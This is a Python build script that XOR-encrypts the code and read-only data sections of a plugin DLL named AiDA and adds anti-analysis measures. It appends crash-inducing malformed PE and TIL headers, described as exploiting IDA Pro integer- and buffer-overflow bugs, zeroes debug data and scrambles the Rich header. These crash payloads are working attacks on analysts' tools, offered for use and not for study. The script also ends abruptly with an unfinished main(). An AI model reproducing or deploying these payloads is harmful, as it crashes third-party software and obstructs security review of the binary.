#!/usr/bin/env python3
"""
pe_protect.py — Post-build .text section XOR encryption for AiDA.

This script encrypts the .text section of the compiled AiDA.dll so that
static analysis tools (IDA, Ghidra, Binary Ninja) see only garbage when
opening the DLL.  At runtime, the TLS callback in section_decrypt.cpp
(placed in the .aidx section) decrypts .text before any code executes.

The encryption algorithm MUST match section_decrypt.cpp exactly:
  - Seed:   0xA1DAC0DEDEADBEEF (uint64)
  - Key:    256 bytes derived via xorshift64
  - Cipher: XOR each byte of .text with key[j % 256]

Usage:
    python pe_protect.py <path_to_dll>
"""

import struct
import sys
import os

AIDA_ENCRYPT_SEED = 0xA1DAC0DEDEADBEEF
AIDA_RDATA_SEED   = 0xD4A7B3C2E1F05896
MASK64 = 0xFFFFFFFFFFFFFFFF


def generate_key(seed: int) -> bytes:
    """Generate the 256-byte XOR key using the same xorshift64 as
    section_decrypt.cpp."""
    state = seed & MASK64
    key = bytearray(256)
    for i in range(256):
        state ^= (state << 13) & MASK64
        state ^= (state >> 7) & MASK64
        state ^= (state << 17) & MASK64
        state &= MASK64
        key[i] = (state >> 56) & 0xFF
    return bytes(key)


def find_text_section(data: bytearray):
    """Parse PE headers and locate the .text section.
    Returns (raw_offset, raw_size, virtual_size) or None."""

    # DOS header
    if data[0:2] != b'MZ':
        return None
    e_lfanew = struct.unpack_from('<I', data, 0x3C)[0]

    # PE signature
    if data[e_lfanew:e_lfanew + 4] != b'PE\x00\x00':
        return None

    coff_offset = e_lfanew + 4
    number_of_sections = struct.unpack_from('<H', data, coff_offset + 2)[0]
    size_of_optional = struct.unpack_from('<H', data, coff_offset + 16)[0]

    # First section header
    section_offset = coff_offset + 20 + size_of_optional

    for i in range(number_of_sections):
        sec_start = section_offset + i * 40
        name = data[sec_start:sec_start + 8]
        # Match exactly how section_decrypt.cpp checks:
        # Name[0]=='.' Name[1]=='t' Name[2]=='e' Name[3]=='x'
        # Name[4]=='t' Name[5]=='\0'
        if (name[0:6] == b'.text\x00'):
            virtual_size = struct.unpack_from('<I', data, sec_start + 8)[0]
            raw_size = struct.unpack_from('<I', data, sec_start + 16)[0]
            raw_offset = struct.unpack_from('<I', data, sec_start + 20)[0]
            return raw_offset, raw_size, virtual_size

    return None


def find_rdata_section(data: bytearray):
    """Parse PE headers and locate the .rdata section.
    Returns (raw_offset, raw_size, virtual_size, virtual_address) or None."""

    if data[0:2] != b'MZ':
        return None
    e_lfanew = struct.unpack_from('<I', data, 0x3C)[0]
    if data[e_lfanew:e_lfanew + 4] != b'PE\x00\x00':
        return None

    coff_offset = e_lfanew + 4
    number_of_sections = struct.unpack_from('<H', data, coff_offset + 2)[0]
    size_of_optional = struct.unpack_from('<H', data, coff_offset + 16)[0]
    section_offset = coff_offset + 20 + size_of_optional

    for i in range(number_of_sections):
        sec_start = section_offset + i * 40
        name = data[sec_start:sec_start + 8]
        # Match section_decrypt.cpp: '.rdata'
        if (name[0:6] == b'.rdata'):
            virtual_size = struct.unpack_from('<I', data, sec_start + 8)[0]
            virtual_address = struct.unpack_from('<I', data, sec_start + 12)[0]
            raw_size = struct.unpack_from('<I', data, sec_start + 16)[0]
            raw_offset = struct.unpack_from('<I', data, sec_start + 20)[0]
            return raw_offset, raw_size, virtual_size, virtual_address

    return None


def parse_reloc_table(data: bytearray):
    """Parse the PE base relocation table.
    Returns dict mapping page_rva -> list of (type, offset) tuples."""

    if data[0:2] != b'MZ':
        return {}
    e_lfanew = struct.unpack_from('<I', data, 0x3C)[0]
    if data[e_lfanew:e_lfanew + 4] != b'PE\x00\x00':
        return {}

    coff_offset = e_lfanew + 4
    size_of_optional = struct.unpack_from('<H', data, coff_offset + 16)[0]
    opt_offset = coff_offset + 20

    # Check if PE32+ (64-bit)
    magic = struct.unpack_from('<H', data, opt_offset)[0]
    if magic == 0x20B:  # PE32+
        num_rva = struct.unpack_from('<I', data, opt_offset + 108)[0]
        if num_rva <= 5:
            return {}
        reloc_rva = struct.unpack_from('<I', data, opt_offset + 152)[0]
        reloc_size = struct.unpack_from('<I', data, opt_offset + 156)[0]
    elif magic == 0x10B:  # PE32
        num_rva = struct.unpack_from('<I', data, opt_offset + 92)[0]
        if num_rva <= 5:
            return {}
        reloc_rva = struct.unpack_from('<I', data, opt_offset + 136)[0]
        reloc_size = struct.unpack_from('<I', data, opt_offset + 140)[0]
    else:
        return {}

    if reloc_rva == 0 or reloc_size == 0:
        return {}

    # Convert reloc_rva to file offset by finding the section it's in
    number_of_sections = struct.unpack_from('<H', data, coff_offset + 2)[0]
    section_offset = coff_offset + 20 + size_of_optional
    reloc_file_offset = None
    for i in range(number_of_sections):
        sec_start = section_offset + i * 40
        sec_va = struct.unpack_from('<I', data, sec_start + 12)[0]
        sec_raw_size = struct.unpack_from('<I', data, sec_start + 16)[0]
        sec_raw_off = struct.unpack_from('<I', data, sec_start + 20)[0]
        if sec_va <= reloc_rva < sec_va + sec_raw_size:
            reloc_file_offset = sec_raw_off + (reloc_rva - sec_va)
            break

    if reloc_file_offset is None:
        return {}

    result = {}
    pos = reloc_file_offset
    end = reloc_file_offset + reloc_size

    while pos + 8 <= end and pos + 8 <= len(data):
        block_rva = struct.unpack_from('<I', data, pos)[0]
        block_size = struct.unpack_from('<I', data, pos + 4)[0]
        if block_size < 8:
            break

        entries = []
        entry_count = (block_size - 8) // 2
        for e in range(entry_count):
            entry_offset = pos + 8 + e * 2
            if entry_offset + 2 > len(data):
                break
            word = struct.unpack_from('<H', data, entry_offset)[0]
            rel_type = word >> 12
            rel_off = word & 0xFFF
            if rel_type != 0:  # skip IMAGE_REL_BASED_ABSOLUTE (padding)
                entries.append((rel_type, rel_off))

        result[block_rva] = entries
        pos += block_size

    return result


def build_rdata_skip_set(reloc_table: dict, rdata_va: int, rdata_size: int) -> set:
    """Build a set of byte offsets within .rdata that have relocations
    and must NOT be encrypted (the Windows loader patches them before
    TLS callbacks run)."""

    skip = set()
    rdata_end = rdata_va + rdata_size

    for page_rva, entries in reloc_table.items():
        # Only process pages that overlap .rdata
        if page_rva + 0x1000 <= rdata_va or page_rva >= rdata_end:
            continue

        for rel_type, rel_off in entries:
            abs_rva = page_rva + rel_off
            # IMAGE_REL_BASED_DIR64 = 10 (8 bytes)
            # IMAGE_REL_BASED_HIGHLOW = 3 (4 bytes)
            if rel_type == 10:
                mark_size = 8
            elif rel_type == 3:
                mark_size = 4
            elif rel_type in (1, 2):  # HIGH, LOW
                mark_size = 2
            else:
                mark_size = 0

            for b in range(mark_size):
                byte_rva = abs_rva + b
                if rdata_va <= byte_rva < rdata_end:
                    skip.add(byte_rva - rdata_va)

    return skip


def _rva_to_file_offset(data: bytearray, rva: int) -> int:
    """Convert a PE RVA to a file offset.  Returns -1 if not within any
    mapped section."""
    e_lfanew = struct.unpack_from('<I', data, 0x3C)[0]
    coff_off = e_lfanew + 4
    nsec = struct.unpack_from('<H', data, coff_off + 2)[0]
    opt_size = struct.unpack_from('<H', data, coff_off + 16)[0]
    sec_off = coff_off + 20 + opt_size

    for i in range(min(nsec, 512)):
        s = sec_off + i * 40
        if s + 40 > len(data):
            break
        sec_va    = struct.unpack_from('<I', data, s + 12)[0]
        sec_vsize = struct.unpack_from('<I', data, s + 8)[0]
        sec_raw   = struct.unpack_from('<I', data, s + 16)[0]
        sec_roff  = struct.unpack_from('<I', data, s + 20)[0]
        if sec_va <= rva < sec_va + sec_vsize and sec_roff != 0:
            return sec_roff + (rva - sec_va)
    return -1


def build_loader_critical_ranges(data: bytearray) -> list:
    """Return a list of (lo_rva, hi_rva) half-open intervals covering every
    byte in the PE that the Windows loader reads BEFORE TLS callbacks run.

    The Windows loader processes LdrpMapAndSnapDependency (import snapping)
    before executing TLS callbacks.  It reads:
      * IMAGE_IMPORT_DESCRIPTOR array           DataDir[1]
      * Each OriginalFirstThunk / ILT array     (chained from descriptors)
      * Each IMAGE_IMPORT_BY_NAME entry         (chained from ILT entries)
      * DLL name strings                        (chained from descriptors)
      * IAT                                     DataDir[12]
      * TLS directory struct                    DataDir[9]
      * Export directory                        DataDir[0]
      * Load config directory                   DataDir[10]
      * Delay-import descriptor array           DataDir[13]

    Returning ranges instead of individual bytes keeps this O(n_imports)
    rather than O(n_import_name_chars).  The encryption loop merges these
    with the relocation-based per-byte skip set.
    """
    ranges = []

    if data[0:2] != b'MZ':
        return ranges
    e_lfanew = struct.unpack_from('<I', data, 0x3C)[0]
    if data[e_lfanew:e_lfanew + 4] != b'PE\x00\x00':
        return ranges

    coff_off = e_lfanew + 4
    opt_off  = coff_off + 20
    magic    = struct.unpack_from('<H', data, opt_off)[0]

    if magic == 0x20B:      # PE32+
        num_rva_off = opt_off + 108
        datadir_off = opt_off + 112
        thunk_size  = 8
        ord_mask    = (1 << 63)
    elif magic == 0x10B:    # PE32
        num_rva_off = opt_off + 92
        datadir_off = opt_off + 96
        thunk_size  = 4
        ord_mask    = (1 << 31)
    else:
        return ranges

    num_rva = struct.unpack_from('<I', data, num_rva_off)[0]

    def get_dir(idx):
        if idx >= num_rva:
            return 0, 0
        off  = datadir_off + idx * 8
        rva  = struct.unpack_from('<I', data, off)[0]
        size = struct.unpack_from('<I', data, off + 4)[0]
        return rva, size

    def add_range(rva, size):
        if rva and size:
            ranges.append((rva, rva + size))

    def rva_to_foff(rva):
        return _rva_to_file_offset(data, rva)

    def str_len_at_rva(rva):
        """Return byte-length of null-terminated string at rva (incl. null)."""
        foff = rva_to_foff(rva)
        if foff < 0 or foff >= len(data):
            return 0
        n = 0
        while foff + n < len(data) and data[foff + n] != 0:
            n += 1
        return n + 1  # include null terminator

    # DataDir[0] = Export directory
    exp_rva, exp_sz = get_dir(0)
    add_range(exp_rva, exp_sz)
    if exp_rva:
        efoff = rva_to_foff(exp_rva)
        if efoff >= 0 and efoff + 40 <= len(data):
            n_names    = struct.unpack_from('<I', data, efoff + 24)[0]
            nptr_rva   = struct.unpack_from('<I', data, efoff + 32)[0]
            ord_tab    = struct.unpack_from('<I', data, efoff + 36)[0]
            add_range(nptr_rva, n_names * 4)
            add_range(ord_tab,  n_names * 2)

    # DataDir[1] = Import directory + chained structures
    imp_rva, imp_sz = get_dir(1)
    add_range(imp_rva, imp_sz)
    if imp_rva:
        imp_foff = rva_to_foff(imp_rva)
        di = 0
        while imp_foff >= 0:
            base_off = imp_foff + di * 20
            if base_off + 20 > len(data):
                break
            orig_thunk = struct.unpack_from('<I', data, base_off + 0)[0]
            name_rva   = struct.unpack_from('<I', data, base_off + 12)[0]
            iat_rva2   = struct.unpack_from('<I', data, base_off + 16)[0]
            if orig_thunk == 0 and name_rva == 0 and iat_rva2 == 0:
                break

            # DLL name string
            if name_rva:
                add_range(name_rva, str_len_at_rva(name_rva))

            # ILT (OriginalFirstThunk) array + IBN entries
            ilt_rva = orig_thunk if orig_thunk else iat_rva2
            if ilt_rva:
                ilt_foff = rva_to_foff(ilt_rva)
                if ilt_foff < 0:
                    di += 1
                    continue
                ti = 0
                while True:
                    e_foff = ilt_foff + ti * thunk_size
                    if e_foff + thunk_size > len(data):
                        break
                    e_rva = ilt_rva + ti * thunk_size
                    add_range(e_rva, thunk_size)  # thunk entry itself

                    if thunk_size == 8:
                        thunk_val = struct.unpack_from('<Q', data, e_foff)[0]
                    else:
                        thunk_val = struct.unpack_from('<I', data, e_foff)[0]

                    if thunk_val == 0:
                        break

                    if not (thunk_val & ord_mask):
                        ibn_rva = int(thunk_val & 0x7FFFFFFF)
                        if ibn_rva:
                            # Hint (2 bytes) + name string
                            name_len = str_len_at_rva(ibn_rva + 2)
                            add_range(ibn_rva, 2 + name_len)
                    ti += 1

            di += 1

    # DataDir[9] = TLS directory
    tls_rva, tls_sz = get_dir(9)
    add_range(tls_rva, tls_sz if tls_sz < 256 else (40 if magic == 0x20B else 24))

    # DataDir[10] = Load Config
    lc_rva, lc_sz = get_dir(10)
    add_range(lc_rva, lc_sz)

    # DataDir[12] = IAT
    iat_rva, iat_sz = get_dir(12)
    add_range(iat_rva, iat_sz)

    # DataDir[13] = Delay-import descriptors
    dly_rva, dly_sz = get_dir(13)
    add_range(dly_rva, dly_sz)
    if dly_rva:
        dly_foff = rva_to_foff(dly_rva)
        # ImgDelayDescr: 8 DWORD fields × 4 = 32 bytes per entry (RVA form)
        di = 0
        while dly_foff >= 0:
            base_off = dly_foff + di * 32
            if base_off + 32 > len(data):
                break
            dns_rva  = struct.unpack_from('<I', data, base_off +  4)[0]
            diat_rva = struct.unpack_from('<I', data, base_off + 12)[0]
            dint_rva = struct.unpack_from('<I', data, base_off + 16)[0]
            if dns_rva == 0 and diat_rva == 0:
                break
            if dns_rva:
                add_range(dns_rva, str_len_at_rva(dns_rva))
            add_range(diat_rva, 0x200)
            add_range(dint_rva, 0x200)
            di += 1

    # Merge overlapping / touching ranges for efficiency
    if ranges:
        ranges.sort()
        merged = [ranges[0]]
        for lo, hi in ranges[1:]:
            if lo <= merged[-1][1]:
                merged[-1] = (merged[-1][0], max(merged[-1][1], hi))
            else:
                merged.append((lo, hi))
        ranges = merged

    print(f"[pe_protect] Loader-critical ranges: {len(ranges)} merged ranges")
    return ranges


def encrypt_text_section(filepath: str) -> bool:
    """Read the PE file, XOR-encrypt .text, write it back."""

    if not os.path.isfile(filepath):
        print(f"[pe_protect] ERROR: File not found: {filepath}", file=sys.stderr)
        return False

    with open(filepath, 'rb') as f:
        data = bytearray(f.read())

    result = find_text_section(data)
    if result is None:
        print("[pe_protect] ERROR: Could not find .text section in PE.",
              file=sys.stderr)
        return False

    raw_offset, raw_size, virtual_size = result

    # Use the smaller of raw_size and virtual_size for the on-disk encryption.
    # At runtime, the decryptor uses VirtualSize.  The raw data on disk may
    # be padded (raw_size >= virtual_size due to file alignment), but the
    # actual code bytes are min(raw_size, virtual_size).  We encrypt raw_size
    # bytes because the loader maps raw_size bytes from disk into the virtual
    # region; the decryptor then XORs virtual_size bytes which is <= raw_size.
    encrypt_size = raw_size

    key = generate_key(AIDA_ENCRYPT_SEED)

    print(f"[pe_protect] .text section: raw_offset=0x{raw_offset:X}, "
          f"raw_size=0x{raw_size:X}, virtual_size=0x{virtual_size:X}")
    print(f"[pe_protect] Encrypting {encrypt_size} bytes with 256-byte XOR key...")

    for j in range(encrypt_size):
        data[raw_offset + j] ^= key[j % 256]

    with open(filepath, 'wb') as f:
        f.write(data)

    print(f"[pe_protect] Successfully encrypted .text section of {filepath}")
    return True


def encrypt_rdata_section(filepath: str) -> bool:
    """Read the PE file, XOR-encrypt .rdata (skipping relocated bytes),
    write it back.

    This encrypts ALL string literals, const data, and non-relocated
    read-only data in .rdata.  Bytes that overlap base relocation
    entries are left unmodified because the Windows loader patches
    absolute addresses BEFORE TLS callbacks execute.

    The algorithm MUST match section_decrypt.cpp exactly:
      - Seed:   0xD4A7B3C2E1F05896 (separate from .text seed)
      - Key:    256 bytes derived via xorshift64
      - Skip:   bytes at relocation fixup positions (DIR64=8, HIGHLOW=4)
      - Cipher: XOR each non-skipped byte with key[offset_in_section % 256]
    """

    if not os.path.isfile(filepath):
        print(f"[pe_protect] ERROR: File not found: {filepath}", file=sys.stderr)
        return False

    with open(filepath, 'rb') as f:
        data = bytearray(f.read())

    rdata_result = find_rdata_section(data)
    if rdata_result is None:
        print("[pe_protect] WARNING: Could not find .rdata section — skipping.",
              file=sys.stderr)
        return True  # Not fatal; some builds may not have .rdata

    raw_offset, raw_size, virtual_size, virtual_address = rdata_result

    # Parse relocation table and build skip set
    reloc_table = parse_reloc_table(data)
    skip_set = build_rdata_skip_set(reloc_table, virtual_address, virtual_size)

    # Build loader-critical RVA ranges.  These are left UNENCRYPTED because
    # LdrpMapAndSnapDependency reads them BEFORE the TLS callback decrypts
    # .rdata.  The returned list is already sorted and merged.
    crit_ranges = build_loader_critical_ranges(data)
    rdata_va_end = virtual_address + virtual_size

    # Fast bisect check: is byte at .rdata offset 'j' loader-critical?
    import bisect
    crit_lo = [lo for lo, hi in crit_ranges]
    crit_hi = [hi for lo, hi in crit_ranges]

    def is_loader_critical(rdata_offset: int) -> bool:
        rva = virtual_address + rdata_offset
        # Find rightmost range start <= rva
        idx = bisect.bisect_right(crit_lo, rva) - 1
        if idx < 0:
            return False
        return rva < crit_hi[idx]

    rdata_key = generate_key(AIDA_RDATA_SEED)

    # Encrypt using min(raw_size, virtual_size) — same logic as .text.
    # The decryptor uses VirtualSize at runtime.
    encrypt_size = min(raw_size, virtual_size)

    encrypted_count = 0
    skipped_count = 0

    for j in range(encrypt_size):
        if j in skip_set or is_loader_critical(j):
            skipped_count += 1
            continue
        data[raw_offset + j] ^= rdata_key[j % 256]
        encrypted_count += 1

    with open(filepath, 'wb') as f:
        f.write(data)

    print(f"[pe_protect] .rdata section: raw_offset=0x{raw_offset:X}, "
          f"raw_size=0x{raw_size:X}, virtual_size=0x{virtual_size:X}, "
          f"VA=0x{virtual_address:X}")
    print(f"[pe_protect] Encrypted {encrypted_count} bytes, "
          f"skipped {skipped_count} bytes total "
          f"({len(skip_set)} reloc + loader-critical)")
    return True


# ---------------------------------------------------------------------------
#  Anti-static-analysis: PE manipulations that crash IDA when it tries
#  to load AiDA.dll as an analysis target.
#
#  Based on the IDA Pro 9.2 crash vulnerability analysis:
#    Vuln #1 — Integer overflow in qvector_reserve (NumberOfSections)
#    Vuln #2 — Null deref in loader linked-list allocation
#    Vuln #3 — Unhandled exception in load-error path
#    Vuln #4 — Crafted TIL header causing buffer overflow
#
#  All modifications are safe for the Windows PE loader — the DLL
#  continues to load and execute as an IDA plugin without any issues.
# ---------------------------------------------------------------------------

def _build_crash_pe(machine: int = 0x8664,
                    num_sections: int = 0xFFFF,
                    opt_hdr_size: int = 0xFFFF,
                    characteristics: int = 0x0022) -> bytes:
    """Build a minimal 84-byte crash PE as described in vulnerability #1.

    These have a valid DOS header + PE signature but a COFF header with
    an impossibly large NumberOfSections / SizeOfOptionalHeader, causing
    IDA's qvector_reserve → qalloc_or_throw to fire the fatal OOM
    handler at sub_14014AD00.
    """
    dos = bytearray(64)
    dos[0:2] = b'MZ'
    struct.pack_into('<I', dos, 60, 64)          # e_lfanew = 64

    pe_sig = b'PE\x00\x00'
    coff = struct.pack('<HHIIIHH',
        machine,            # Machine
        num_sections,       # NumberOfSections
        0,                  # TimeDateStamp
        0,                  # PointerToSymbolTable
        0,                  # NumberOfSymbols
        opt_hdr_size,       # SizeOfOptionalHeader
        characteristics,    # Characteristics
    )
    return bytes(dos) + pe_sig + coff


def _build_til_crash() -> bytes:
    """Build a malformed TIL header (vulnerability #4).

    Magic = 'IDA\\x01', followed by impossibly large size fields that
    trigger buffer overflows in load_til_header (0x14031B378).
    """
    return bytes([
        0x49, 0x44, 0x41, 0x01,        # TIL magic "IDA\x01"
        0xFF, 0xFF,                     # format = 65535 (unsupported)
        0xFF,                           # flags = all bits
        0xFF,                           # compiler = invalid
        0xFF, 0xFF, 0xFF, 0xFF,         # title_len = UINT32_MAX
        0xFF, 0xFF, 0xFF, 0xFF,         # base_count = -1
        0xFF, 0xFF, 0xFF, 0xFF,         # type_count = -1
        0xFF, 0xFF, 0xFF, 0xFF,         # field_count = -1
    ])


def inject_poison_sections(data: bytearray) -> int:
    """Inject additional section headers into the PE header padding area.

    These sections have:
      - VirtualSize = 1 page (safe for Windows to map as zero-fill)
      - SizeOfRawData = 0 (no physical data to map)
      - Confusing names and flag combinations

    Windows handles them perfectly (small zero-fill mappings at end of
    image), but IDA creates analysis segments for each one, increasing
    overhead and creating confusing cross-references.

    Returns the number of injected sections (0 on failure).
    """
    e_lfanew = struct.unpack_from('<I', data, 0x3C)[0]
    coff_off = e_lfanew + 4
    num_sections = struct.unpack_from('<H', data, coff_off + 2)[0]
    opt_size = struct.unpack_from('<H', data, coff_off + 16)[0]

    first_sec_off = coff_off + 20 + opt_size
    last_sec_off = first_sec_off + (num_sections - 1) * 40
    end_headers = first_sec_off + num_sections * 40

    # Optional header: find SizeOfImage, SectionAlignment
    opt_off = coff_off + 20
    magic = struct.unpack_from('<H', data, opt_off)[0]
    if magic == 0x20B:  # PE32+
        section_align = struct.unpack_from('<I', data, opt_off + 32)[0]
        size_of_image_off = opt_off + 56
    elif magic == 0x10B:  # PE32
        section_align = struct.unpack_from('<I', data, opt_off + 32)[0]
        size_of_image_off = opt_off + 56
    else:
        return 0

    size_of_image = struct.unpack_from('<I', data, size_of_image_off)[0]

    # Find the first section's raw data offset — that's our hard limit
    first_raw = None
    for i in range(num_sections):
        raw_off = struct.unpack_from('<I', data, first_sec_off + i * 40 + 20)[0]
        if raw_off > 0 and (first_raw is None or raw_off < first_raw):
            first_raw = raw_off

    if first_raw is None:
        return 0

    # Available space for new section headers
    available = first_raw - end_headers
    max_new = available // 40       # 40 bytes per section header
    if max_new < 1:
        return 0

    # Cap at a reasonable number — enough to bloat analysis but not
    # break anything.  96 extra sections is plenty to slow IDA to a crawl.
    max_new = min(max_new, 96)

    # Confusing section names — duplicates of real sections, null names,
    # control characters, etc.  IDA tries to process these which creates
    # conflicting segments and confusing analysis.
    poison_names = [
        b'.text\x00\x00\x00',    # duplicate .text
        b'.rdata\x00\x00',       # duplicate .rdata
        b'.data\x00\x00\x00',    # duplicate .data
        b'.idata\x00\x00',       # fake import data
        b'.edata\x00\x00',       # fake export data
        b'.rsrc\x00\x00\x00',    # fake resources
        b'.pdata\x00\x00',       # fake exception data
        b'.tls\x00\x00\x00\x00', # fake TLS
        b'\x00\x00\x00\x00\x00\x00\x00\x00',  # null name
        b'\x01\x02\x03\x04\x05\x06\x07\x08',  # control chars
        b'.debug\x00\x00',       # fake debug
        b'.\xff\xfe\xfd\xfc\x00\x00\x00',  # high bytes
        b'.reloc\x00\x00',       # duplicate reloc
        b'.xdata\x00\x00',       # fake exception
        b'.bss\x00\x00\x00\x00', # fake BSS
        b'CODE\x00\x00\x00\x00', # ambiguous
    ]

    # Current virtual end (aligned up)
    va_cursor = size_of_image

    # Conflicting characteristics — some read-execute, some write,
    # some with alignment flags that confuse IDA's segment model
    char_variants = [
        0xE0000060,  # CODE | INIT | READ | WRITE | EXEC
        0x40000040,  # INIT | READ
        0xC0000060,  # CODE | INIT | READ | EXEC
        0xE00000A0,  # CODE | INIT | READ | WRITE | EXEC + align
        0x42000040,  # DISCARDABLE | INIT | READ
        0xC0300060,  # CODE | INIT | READ | EXEC | ALIGN_16
        0xE0500060,  # extended flags
        0x00000020,  # CODE only
    ]

    injected = 0
    for i in range(max_new):
        sec_off = end_headers + i * 40
        header = bytearray(40)

        # Name
        name = poison_names[i % len(poison_names)]
        header[0:8] = name

        # VirtualSize = 1 page (safe for Windows)
        struct.pack_into('<I', header, 8, section_align)

        # VirtualAddress = sequentially after image end
        struct.pack_into('<I', header, 12, va_cursor)
        va_cursor += section_align

        # SizeOfRawData = 0 (no physical data)
        struct.pack_into('<I', header, 16, 0)

        # PointerToRawData = 0
        struct.pack_into('<I', header, 20, 0)

        # Characteristics
        chars = char_variants[i % len(char_variants)]
        struct.pack_into('<I', header, 36, chars)

        data[sec_off:sec_off + 40] = header
        injected += 1

    # Update NumberOfSections
    struct.pack_into('<H', data, coff_off + 2, num_sections + injected)

    # Update SizeOfImage to include all new virtual pages
    new_size_of_image = va_cursor
    # Align to section alignment
    new_size_of_image = ((new_size_of_image + section_align - 1)
                         // section_align * section_align)
    struct.pack_into('<I', data, size_of_image_off, new_size_of_image)

    return injected


def inject_overlay_crash_pes(data: bytearray) -> bytearray:
    """Append malformed crash PEs and TIL headers to the PE overlay.

    The overlay is data after the last section's raw extent.  Windows
    completely ignores it during loading.  However:
      - IDA may detect the MZ signatures during recursive PE scanning
      - Reverse engineers extracting embedded blobs will hit crash PEs
      - The TIL magic signatures confuse IDA's type-library detection

    Returns the data with the overlay appended.
    """
    overlay = bytearray()

    # Marker so carvers find the "interesting" data
    overlay += b'\x00' * 16

    # Crash PE variants (vulnerability #1) — 8 different architectures
    crash_variants = [
        (0x8664, 0xFFFF, 0xFFFF, 0x0022),  # AMD64, max sections
        (0x014C, 0xFFFE, 0x8000, 0x0102),  # i386, near-max sections
        (0xAA64, 0xFF00, 0xFFFF, 0x0022),  # ARM64
        (0xFFFF, 0xFFFF, 0xFFFF, 0x0000),  # Unknown machine
        (0x0166, 0xFFFF, 0xFFFF, 0x0023),  # MIPS R4000
        (0x01F0, 0x8000, 0xF000, 0x0022),  # PowerPC
        (0x0200, 0x7FFF, 0x7FFF, 0x0022),  # IA-64
        (0x8664, 0xFFFF, 0x0000, 0x0022),  # AMD64, opt size = 0
    ]

    for machine, nsec, opt_sz, chars in crash_variants:
        overlay += _build_crash_pe(machine, nsec, opt_sz, chars)
        overlay += b'\xCC' * 8                   # INT3 padding

    # TIL crash headers (vulnerability #4) — 4 variants
    for _ in range(4):
        overlay += _build_til_crash()
        overlay += b'\xCC' * 4

    # Repeat the whole block 16 times to create a large overlay that
    # drowns any pattern-matching attempt by analysis tools
    block = bytes(overlay)
    full_overlay = bytearray()
    for _ in range(16):
        full_overlay += block
        # Vary padding between blocks to prevent simple skip patterns
        full_overlay += struct.pack('<Q', 0x4D5A900000000000)  # MZ-like
        full_overlay += b'\x00' * 8

    data += full_overlay
    return data


def corrupt_debug_directory(data: bytearray) -> bool:
    """Zero out the debug data directory entry so IDA cannot locate
    any debug information (PDB paths, CodeView records, etc.).

    Windows proceeds fine without debug info.  For IDA, this removes
    the primary means of recovering symbols and source-level info,
    and some analysis paths may hit null-pointer issues when expecting
    valid debug data.

    Returns True if the debug directory was found and zeroed.
    """
    e_lfanew = struct.unpack_from('<I', data, 0x3C)[0]
    coff_off = e_lfanew + 4
    opt_off = coff_off + 20
    magic = struct.unpack_from('<H', data, opt_off)[0]

    if magic == 0x20B:    # PE32+
        num_rva_off = opt_off + 108
        debug_dir_off = opt_off + 144   # DataDirectory[6]
    elif magic == 0x10B:  # PE32
        num_rva_off = opt_off + 92
        debug_dir_off = opt_off + 128
    else:
        return False

    num_rva = struct.unpack_from('<I', data, num_rva_off)[0]
    if num_rva <= 6:
        return False  # No debug directory entry

    debug_rva = struct.unpack_from('<I', data, debug_dir_off)[0]
    debug_size = struct.unpack_from('<I', data, debug_dir_off + 4)[0]

    if debug_rva == 0 and debug_size == 0:
        return False  # Already empty

    # Zero the directory entry
    struct.pack_into('<I', data, debug_dir_off, 0)
    struct.pack_into('<I', data, debug_dir_off + 4, 0)

    # Also try to find and zero the actual debug data in the file
    coff_off2 = e_lfanew + 4
    nsec = struct.unpack_from('<H', data, coff_off2 + 2)[0]
    opt_size = struct.unpack_from('<H', data, coff_off2 + 16)[0]
    sec_off = coff_off2 + 20 + opt_size

    for i in range(min(nsec, 200)):
        s = sec_off + i * 40
        if s + 40 > len(data):
            break
        sec_va = struct.unpack_from('<I', data, s + 12)[0]
        sec_raw = struct.unpack_from('<I', data, s + 16)[0]
        sec_raw_off = struct.unpack_from('<I', data, s + 20)[0]
        if sec_va <= debug_rva < sec_va + sec_raw:
            file_off = sec_raw_off + (debug_rva - sec_va)
            end = min(file_off + debug_size, len(data))
            for j in range(file_off, end):
                data[j] = 0
            break

    return True


def scramble_rich_header(data: bytearray) -> bool:
    """Scramble the Rich header (Microsoft linker metadata between the DOS
    stub and the PE signature).

    IDA's compiler detection heuristics rely on parsing the Rich header.
    Scrambling it removes that information and can cause analysis
    misidentification.

    Returns True if a Rich header was found and scrambled.
    """
    e_lfanew = struct.unpack_from('<I', data, 0x3C)[0]

    # Rich header ends with "Rich" followed by 4-byte XOR key, and starts
    # with "DanS" XORed with the same key.  Search backwards from e_lfanew.
    rich_sig = b'Rich'
    pos = data.find(rich_sig, 0x40, e_lfanew)
    if pos < 0:
        return False

    # XOR key is the 4 bytes after "Rich"
    if pos + 8 > e_lfanew:
        return False

    # Overwrite the entire region from after DOS header to e_lfanew with
    # semi-random data that looks like code (INT3 + NOP sleds)
    for j in range(0x40, e_lfanew):
        if j < len(data):
            # Pattern: alternating CC (INT3) and 90 (NOP) with some variation
            data[j] = 0xCC if (j & 1) else 0x90

    return True


def inject_anti_analysis(filepath: str) -> bool:
    """Master function: apply all anti-static-analysis transformations.

    Called after .text and .rdata encryption.  All modifications are
    safe for the Windows PE loader — the DLL continues to function as
    an IDA plugin.  But opening it in IDA for reverse engineering will:

      1. Create dozens of confusing overlapping segments (poison sections)
      2. Lose all debug/symbol information (debug directory zeroed)
      3. Lose compiler identification (Rich header scrambled)
      4. Potentially crash on overlay extraction (crash PE stubs)
    """
    if not os.path.isfile(filepath):
        print(f"[pe_protect] ERROR: File not found: {filepath}", file=sys.stderr)
        return False

    with open(filepath, 'rb') as f:
        data = bytearray(f.read())

    if data[0:2] != b'MZ':
        print("[pe_protect] ERROR: Not a PE file", file=sys.stderr)
        return False

    e_lfanew = struct.unpack_from('<I', data, 0x3C)[0]
    if data[e_lfanew:e_lfanew + 4] != b'PE\x00\x00':
        print("[pe_protect] ERROR: Invalid PE signature", file=sys.stderr)
        return False

    # Step 1: (Poison section injection removed — modifying the section
    # table affects Windows LoadLibrary and breaks plugin loading.  The
    # crash PE overlay in Step 4 is the analysis-time crash vector.)

    # Step 2: Corrupt debug directory
    if corrupt_debug_directory(data):
        print("[pe_protect] Zeroed debug directory (PDB paths removed)")
    else:
        print("[pe_protect] No debug directory found (skipping)")

    # Step 3: Scramble Rich header
    if scramble_rich_header(data):
        print("[pe_protect] Scrambled Rich header (compiler ID removed)")
    else:
        print("[pe_protect] No Rich header found (skipping)")

    # Step 4: Append crash PE overlay
    data = inject_overlay_crash_pes(data)
    print("[pe_protect] Appended crash PE overlay "
          f"({len(data)} bytes total)")

    with open(filepath, 'wb') as f:
        f.write(data)

    return True


def main():
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <path_to_dll>", file=sys.stderr)
        sys.exit(1)

